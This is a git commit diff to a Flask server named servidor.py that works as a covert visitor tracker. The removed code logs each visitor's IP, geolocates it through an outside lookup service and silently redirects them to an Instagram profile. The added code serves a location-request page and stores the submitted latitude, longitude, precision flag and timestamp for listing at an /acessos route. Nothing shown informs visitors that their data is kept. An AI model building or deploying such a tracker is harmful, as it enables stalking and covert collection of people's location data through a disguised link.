63b30f09ead64961c8ef3121fe47d89b4be76e4f
maicon.ferreira <maicon.ferreira@vmis.com.br>
2025-04-25 08:07:57 -0300

    coleta

--- servidor.py
+++ servidor.py
@@ -1,32 +1,27 @@
 from flask import Flask, request, redirect, jsonify, render_template
-import requests
+import datetime
 
 app = Flask(__name__)
 acessos = []
 
 @app.route('/')
-def redirecionar():
+def solicitar_localizacao():
+    return render_template('coleta.html')
+
+@app.route('/registrar', methods=['POST'])
+def registrar():
+    data = request.get_json()
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
 
-    try:
-        geo_info = requests.get(f'https://ipinfo.io/{ip}/json').json()
-        loc = geo_info.get('loc', '')
-        lat, lon = map(float, loc.split(',')) if loc else (0.0, 0.0)
-    except:
-        lat, lon = 0.0, 0.0
-        geo_info = {}
-
-    # Armazenar dados
-    acessos.append({
+    acesso = {
         'ip': ip,
-        'lat': lat,
-        'lon': lon,
-        'city': geo_info.get('city', 'Desconhecida'),
-        'region': geo_info.get('region', 'Desconhecida'),
-        'country': geo_info.get('country', 'Desconhecido')
-    })
-
-    return redirect("https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0", code=302)
+        'lat': data.get('lat'),
+        'lon': data.get('lon'),
+        'precisa': data.get('precisa', False),
+        'timestamp': datetime.datetime.now().isoformat()
+    }
+    acessos.append(acesso)
+    return jsonify({'status': 'ok'})
 
 @app.route('/acessos')
 def mostrar_acessos():
